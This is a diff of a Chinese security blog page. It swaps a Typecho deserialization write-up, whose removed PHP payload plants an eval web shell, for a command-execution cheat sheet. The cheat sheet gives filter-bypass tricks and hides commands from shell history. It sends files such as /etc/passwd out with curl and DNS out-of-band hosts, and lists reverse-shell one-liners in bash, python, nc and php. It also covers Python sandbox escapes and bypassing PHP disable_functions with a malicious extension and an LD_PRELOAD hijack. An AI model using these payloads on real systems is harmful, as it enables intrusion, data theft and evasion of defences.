@@ -84,23 +84,21 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-<meta name="description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
+<meta name="description" content="各种命令执行总结好久没更博客了，就把笔记里的东西整理一下发出来水一篇~  首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行####如何判断是否是linux命令执行">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="typecho反序列化漏洞复现">
-<meta property="og:url" content="http://www.tharavel.site/2017/10/29/typecho-deserialization.html">
+<meta property="og:title" content="各种命令执行总结">
+<meta property="og:url" content="http://www.tharavel.site/2018/03/23/command-execute.html">
 <meta property="og:site_name" content="tharavel's blog">
-<meta property="og:description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/2.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/3.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/4.PNG">
-<meta property="og:image" content="http://op5cjcnmi.bkt.clouddn.com/5.PNG">
-<meta property="og:updated_time" content="2017-11-17T07:26:30.482Z">
+<meta property="og:description" content="各种命令执行总结好久没更博客了，就把笔记里的东西整理一下发出来水一篇~  首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行####如何判断是否是linux命令执行">
+<meta property="og:image" content="https://www.z4a.net/images/2018/01/31/image.png">
+<meta property="og:image" content="https://www.z4a.net/images/2018/01/31/imagedba0f9c8d575d043.md.png">
+<meta property="og:image" content="https://www.z4a.net/images/2018/01/31/te.png">
+<meta property="og:updated_time" content="2018-03-23T08:14:48.582Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="typecho反序列化漏洞复现">
-<meta name="twitter:description" content="typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!i">
-<meta name="twitter:image" content="http://op5cjcnmi.bkt.clouddn.com/1.PNG">
+<meta name="twitter:title" content="各种命令执行总结">
+<meta name="twitter:description" content="各种命令执行总结好久没更博客了，就把笔记里的东西整理一下发出来水一篇~  首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行####如何判断是否是linux命令执行">
+<meta name="twitter:image" content="https://www.z4a.net/images/2018/01/31/image.png">
 
 
 
@@ -128,13 +126,13 @@ border-left-color: #A349A4; /*左边框颜色*/
 
 
 
-  <link rel="canonical" href="http://www.tharavel.site/2017/10/29/typecho-deserialization.html"/>
+  <link rel="canonical" href="http://www.tharavel.site/2018/03/23/command-execute.html"/>
 
 
 
 
 
-  <title>typecho反序列化漏洞复现 | tharavel's blog</title>
+  <title>各种命令执行总结 | tharavel's blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -317,7 +315,7 @@ border-left-color: #A349A4; /*左边框颜色*/
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://www.tharavel.site/2017/10/29/typecho-deserialization.html">
+    <link itemprop="mainEntityOfPage" href="http://www.tharavel.site/2018/03/23/command-execute.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="tharavel">
@@ -338,7 +336,7 @@ border-left-color: #A349A4; /*左边框颜色*/
             
             
               
-                typecho反序列化漏洞复现
+                各种命令执行总结
               
             
           </h2>
@@ -353,8 +351,8 @@ border-left-color: #A349A4; /*左边框颜色*/
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-29T22:51:04+08:00">
-                2017-10-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-23T16:04:37+08:00">
+                2018-03-23
               </time>
             
 
@@ -372,7 +370,7 @@ border-left-color: #A349A4; /*左边框颜色*/
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a class="cloud-tie-join-count" href="/2017/10/29/typecho-deserialization.html#comments" itemprop="discussionUrl">
+                <a class="cloud-tie-join-count" href="/2018/03/23/command-execute.html#comments" itemprop="discussionUrl">
                   <span class="post-comments-count join-count" itemprop="commentCount"></span>
                 </a>
               </span>
@@ -398,17 +396,148 @@ border-left-color: #A349A4; /*左边框颜色*/
       
 
       
-        <h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
-<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
-<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//判断是否已经安装</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 挡掉可能的跨站请求</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</div><div class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。</p>
-<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
+        <h1 id="各种命令执行总结"><a href="#各种命令执行总结" class="headerlink" title="各种命令执行总结"></a>各种命令执行总结</h1><p>好久没更博客了，就把笔记里的东西整理一下发出来水一篇~</p>
+<hr>
+<p>首先说一个小trick:<br>在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加<code>空格</code>即可，该方法仅限在debain内核的系统中。</p>
+<h3 id="0X01-linux命令执行"><a href="#0X01-linux命令执行" class="headerlink" title="0X01 linux命令执行"></a>0X01 <strong>linux命令执行</strong></h3><p>####<strong>如何判断是否是linux命令执行</strong><br>可以使用的判断方法有&amp;+命令或|+命令，如：</p>
 <blockquote>
-<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
+<p>ping &amp;id 或 ping |id<br>curl &amp;id 或 curl |id</p>
 </blockquote>
-<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
-<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
-<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</div><div class="line">	<span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</div><div class="line">	<span class="keyword">private</span> $_items;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[] = <span class="keyword">array</span>(<span class="string">'author'</span>=&gt;$a);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'file_put_contents('</span>shell.php<span class="string">', '</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[tharavel]);<span class="meta">?&gt;</span><span class="string">')'</span>);</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = <span class="keyword">new</span> Typecho_Request();</div><div class="line">$payload2 = <span class="keyword">new</span> Typecho_Feed($payload1);</div><div class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload2, <span class="string">'prefix'</span> =&gt; <span class="string">'typecho'</span>);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure>
+<p>通过返回结果可判断是否是命令执行，同时这也是在前面有ping和curl的情况下进行命令执行的一种方法</p>
+<p>####<strong>读取文件</strong><br>当cat被过滤时，可尝试一下几种读取文件方法：</p>
+<blockquote>
+<p>strings flag.php<br>echo &gt; flag.php<br>uniq -c flag.php<br>bash -v flag.php<br>rev flag.php</p>
+</blockquote>
+<p>或者使用curl上传到vps，并在vps上开启监听进行读取：  </p>
+<blockquote>
+<p>curl -T flag.php “<a href="http://192.168.x.xxx:6666" target="_blank" rel="external">http://192.168.x.xxx:6666</a>“<br>或curl “<a href="http://vpsip/" target="_blank" rel="external">http://vpsip/</a>“ –data-binary @/etc/passwd<br>…<br>在vps上：<br>nc -lvpn 6666</p>
+</blockquote>
+<p>####<strong>空格绕过</strong><br>如果过滤了空格，常用的绕过方法有</p>
+<blockquote>
+<p>$IFS<br>{ls,-l}<br>cat%09flag.php<br>cat &lt; flag.php<br>cat&lt;&gt;flag.php</p>
+</blockquote>
+<p>其中后面两个适用于读取文件,而前两个则可完全代替空格，中间的%09需在php环境下，为了避免$IFS与后面的字符串写在一起被误解，需要分隔开$IFS，常用的方法有一下几种：</p>
+<blockquote>
+<p>${IFS}<br>$IFS$9<br>$IFS\</p>
+</blockquote>
+<p>这里解释一下，$9是linux系统shell进程的第九个参数，始终为空字符串</p>
+<p>####<strong>/绕过</strong></p>
+<blockquote>
+<p>${PATH:0:1}  // ${str:a:b}表示提取字符串a开始的b个字符<br>  ${PATH%%u*}</p>
+</blockquote>
+<p>上面两个都能得到’/‘字符</p>
+<p>利用同样的思路(即字符串截取)，我们可以得到更多~</p>
+<p><a href="https://www.z4a.net/image/Yzkfp" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/image.png" alt="image.png"></a></p>
+<p>当然，一切都要建立在没有过滤$,{和}的基础上</p>
+<p>####<strong>加号绕过</strong></p>
+<blockquote>
+<p>$PS4</p>
+</blockquote>
+<p>####<strong>大于号绕过</strong></p>
+<blockquote>
+<p>$PS2</p>
+</blockquote>
+<p>####<strong>对某些命令的过滤</strong><br>当某些命令被正则匹配的方式过滤时，可以考虑的绕过方法如下：</p>
+<p>字符串拼接：  </p>
+<blockquote>
+<p>a=un;b=ame;$a$b<br>若’;’被过滤，还可用%0a代替分号<br>a=un%0ab=ame%0a$a$b  </p>
+</blockquote>
+<p>字符串截取：</p>
+<blockquote>
+<p>root@xxx:~# echo ${PATH:9:1}${PATH:11:1}<br>ls<br>root@xxx:~# ${PATH:9:1}${PATH:11:1}<br>Desktop  公共  模板  视频  图片  文档  下载  音乐  桌面  </p>
+<p>如果冒号被过滤，可以使用：<br>root@xxx:~# $(expr substr $PATH 10 1)$(expr substr $PATH 12 1)<br>Desktop  公共  模板  视频  图片  文档  下载  音乐  桌面  </p>
+</blockquote>
+<p>base64编码：  </p>
+<blockquote>
+<p>root@xxx:~# echo “dW5hbWU=” | base64 -d |bash<br>root</p>
+</blockquote>
+<p>xxd（16进制）:  </p>
+<blockquote>
+<p>root@xxx:~# printf “77686f616d69” | xxd -r -p | bash<br>root</p>
+</blockquote>
+<p>利用反斜线来绕过:</p>
+<blockquote>
+<p>una\me  </p>
+</blockquote>
+<p>插入空字符串：  </p>
+<blockquote>
+<p>u``name<br>u’’name<br>u””name<br>u${xxx}name</p>
+</blockquote>
+<p>####<strong>对文件名的过滤</strong><br>可用正则绕过，如flag被过滤的情况下读取flag.php，则可以使用：cat fla*来绕过</p>
+<p>####<strong>多条命令执行</strong><br>常见于curl/ping x.x.x.x,且x.x.x.x可控，此时可利用管道符，逻辑运算符，分号及%0a来绕过</p>
+<blockquote>
+<p>ping x.x.x.x |ls<br>ping x.x.x.x ||ls<br>ping x.x.x.x&amp;ls<br>ping x.x.x.x&amp;&amp;ls<br>ping x.x.x.x;ls   </p>
+</blockquote>
+<p>在地址栏执行时可以利用回车的url编码%0a绕过：<br>ping x.x.x.x%0als </p>
+<p>####<strong>对回显限制</strong><br>如果对回显中的特殊字符进行检测，则可以通过base64或16进制编码绕过，如</p>
+<blockquote>
+<p>ls|base64</p>
+</blockquote>
+<p>####<strong>无回显</strong><br>可尝试构建一条带外信道提取数据，如：</p>
+<blockquote>
+<p>curl (你的ip)/?`whoami` 然后查看Apache日志<br>curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)</p>
+</blockquote>
+<p>第二个方式中用到的网站是<a href="http://dnsbin.zhack.ca" target="_blank" rel="external">http://dnsbin.zhack.ca</a>，这是一个免费无需邀请码的网站，强烈推荐！类似的网站还有<a href="http://ceye.io" target="_blank" rel="external">http://ceye.io</a></p>
+<p>命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如<code>cat flag.php|sed &#39;s/[[:space:]]//g&#39;</code>来清除空格,回车替换可以用<code>sed &#39;:a;N;s/\n/*/;ba&#39;</code>，这样就将回车换成了<em>号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用`sed s/\n/</em>/g`不可行)</p>
+<p>如果不想编码，还可以将数据附在HTTP头，如<code>curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;</code><br>或者post数据：<code>id | curl &quot;http://vpsip/&quot; --data-binary @-</code></p>
+<h3 id="0X02-常用shell反弹"><a href="#0X02-常用shell反弹" class="headerlink" title="0X02 常用shell反弹"></a>0X02 <strong>常用shell反弹</strong></h3><p>网上有很多文章总结了，这里简单列举几个:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div><div class="line">```</div></pre></td></tr></table></figure></p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div><div class="line">```</div></pre></td></tr></table></figure></p>
+<p>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 0X03 **Python命令执行**</div><div class="line">下面是python中可用于命令执行的模块</div><div class="line"></div><div class="line">&gt; os  </div><div class="line">subprocess  </div><div class="line">commands  </div><div class="line">platform  </div><div class="line">timeit  </div><div class="line">mimetools  </div><div class="line">pickle  </div><div class="line">pydoc</div><div class="line"></div><div class="line"></div><div class="line">举例：</div><div class="line"></div><div class="line">```python</div><div class="line">#coding:utf-8</div><div class="line">import timeit</div><div class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;&apos;)&quot;, number=1)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> platform</div><div class="line"><span class="keyword">print</span> platform.popen(<span class="string">'id'</span>, mode=<span class="string">'r'</span>, bufsize=<span class="number">-1</span>).read()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.system()  </div><div class="line"><span class="keyword">print</span> os.popen().read()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">subprocess.call([<span class="string">"cmd"</span>,<span class="string">"arg1"</span>,<span class="string">"arg2"</span>],shell=<span class="keyword">True</span>)</div><div class="line">subprocess.Popen(<span class="string">'ls'</span>, shell=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="keyword">print</span> commands.getoutput(<span class="string">'ls'</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> mimetools</div><div class="line">mimitools.pipeto(<span class="keyword">None</span>,<span class="string">'id'</span>) <span class="comment">#注意，mimetools模块的该方法在官方手册中被标记为从python2.3开始弃用，然而事实上在python2.7中仍然可以被使用</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pydoc</div><div class="line">pydoc.pipepager(<span class="keyword">None</span>,<span class="string">'id'</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line">pickle.loads(<span class="string">"cos\nsystem\n(S'ifconfig'\ntR."</span>)</div></pre></td></tr></table></figure>
+<p>当常见的os,subprocess,commands等被过滤时，可尝试用另外几个模块来实现命令执行，或者灵活使用rot13编码绕过：<br><a href="https://www.z4a.net/image/YzPIa" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/imagedba0f9c8d575d043.md.png" alt="imagedba0f9c8d575d043.md.png"></a></p>
+<p>其中，有一点需要注意的是，subprocess中的shell如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法(即执行的命令不能带有参数)。</p>
+<p>####pydoc更多玩法<br>当系统中PAGER环境变量被设置时，pydoc模块将使用该值作为导入文档，这一点可以被用来执行任意命令，比如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>py：</div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> pydoc</div><div class="line">pydoc.pager(<span class="string">""</span>)</div></pre></td></tr></table></figure></p>
+<p>此时在命令行:</p>
+<blockquote>
+<p>$ export PAGER=”whoami”<br>$ python 1.py</p>
+</blockquote>
+<p>此时命令行会显示结果: <code>root</code></p>
+<p>####python沙盒绕过<br>简单的沙盒的绕过方法可以通过编码，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#coding: rot_13</div><div class="line">&apos;vzcbeg bf&apos;  //import os</div></pre></td></tr></table></figure></p>
+<p>有篇文章详细介绍了python沙盒绕过的各种方法：<a href="https://xianzhi.aliyun.com/forum/topic/52" target="_blank" rel="external">Python沙箱逃逸的n种姿势</a>，这篇文章讲的很全面，这里就不再重述</p>
+<h3 id="0X04-PHP命令执行"><a href="#0X04-PHP命令执行" class="headerlink" title="0X04 PHP命令执行"></a>0X04 <strong>PHP命令执行</strong></h3><p>常用的php环境下命令执行操作汇总如下：  </p>
+<p>获取当前文件路径</p>
+<blockquote>
+<p>echo dirname(__FILE__) ;<br>echo getcwd();</p>
+</blockquote>
+<p>获取同目录下的所有文件名称</p>
+<blockquote>
+<p>echo var_dump(glob(‘./*’));<br>system(“ls”)/system(“dir”)/system–&gt;可换成执行系统命令的函数;</p>
+</blockquote>
+<p>读取某个文件的内容</p>
+<blockquote>
+<p>echo file_get_contents(“flag.php”);<br>echo fgets(fopen(“flag.php”,”r”));<br>show_source(“flag.php”);<br>echo fread(fopen(“flag.php”,”r”),filesize(“flag.php”));<br>echo var_dump(file(“flag.php”));<br>copy(“flag.php”,”daiker.txt”);<br>include ‘php://filter/read=convert.base64-encode/resource=flag.php’;<br>highlight_file(“flag.php”);</p>
+</blockquote>
+<p>php配置文件里面有个disable_functions = …，可以用来禁止某些php函数，若常见能够执行系统命令的函数被禁用，又如何命令执行呢<br>首先看看能够执行命令的函数：  </p>
+<blockquote>
+<p>system<br>assert<br>passthru<br>exec<br>pcntl_exec<br>shell_exec<br>popen<br>proc_open</p>
+</blockquote>
+<p>由于函数未禁用全，从而导致命令执行的案例也是很多的，所以当一些函数被禁止时，可尝试其他一些函数</p>
+<p>当以上函数都被过滤时，可以使用下面几种方法：</p>
+<p>####拓展库绕过<br>Linux下可通过编译拓展库进行绕过，在得知目标服务器的php版本后，本地下载相同版本的php源码包，并生成一个精心构造的拓展库，再使用dl函数调用拓展库即可实现命令执行，具体操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">下载好php源码包后：</div><div class="line">tar zxvf php-5.3.10.tar.gz</div><div class="line">cd php-5.3.10/ext</div><div class="line">./ext_skel --extname=shell  //生成名为shell的拓展库</div><div class="line">cd shell</div><div class="line">vi config.m4</div><div class="line"></div><div class="line">将以下三行前面的dnl去掉，然后保存退出：</div><div class="line">PHP_ARG_WITH(dl, for dl support,</div><div class="line">Make sure that the comment is aligned:</div><div class="line">[  --with-dl             Include dl support])</div><div class="line"></div><div class="line">whereis phpize          //找出phpize路径</div><div class="line">/usr/local/bin/phpize     // 运行phpize</div><div class="line">vi shell.c</div><div class="line"></div><div class="line">在</div><div class="line">if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE) &#123;</div><div class="line">    return;</div><div class="line">&#125;</div><div class="line">这一行下面添加：system(arg)  </div><div class="line"></div><div class="line">然后：</div><div class="line">whereis php-config  //找出php-config的路径</div><div class="line">./configure --whith-php-config=php-config路径</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure></p>
+<p>将生成的拓展库文件/usr/local/lib/php/extensions/no-debug-non-zts-20180130/shell.so拷贝到extension_dir目录下，若extension_dir目录无写权限则先写入任意目录 , 在payload中用../../来实现调用<br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">dl(&quot;shell.so&quot;);  //shell.so在extension_dir目录，如不在则用../../来实现调用</div><div class="line">confirm_dl_compiled(&quot;$_GET[a]&gt;flag.txt&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>cat flag.txt便可看到命令执行结果，当然，如果dl函数被禁用，该方法便无效了</p>
+<p>####LD_PRELOAD劫持<br>当disable_functions 中没有禁止 putenv函数时，可以考虑上传个so文件进行LD_PRELOAD劫持，方法如下：<br>在本地，vim shell.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt; </div><div class="line"> </div><div class="line">void payload() &#123;</div><div class="line">        system(&quot;curl `whoami`.9b8534989b407ad73d33.d.zhack.ca&quot;);</div><div class="line">&#125;   </div><div class="line"> </div><div class="line">int  geteuid() &#123;</div><div class="line">if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</div><div class="line">unsetenv(&quot;LD_PRELOAD&quot;);</div><div class="line">payload();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
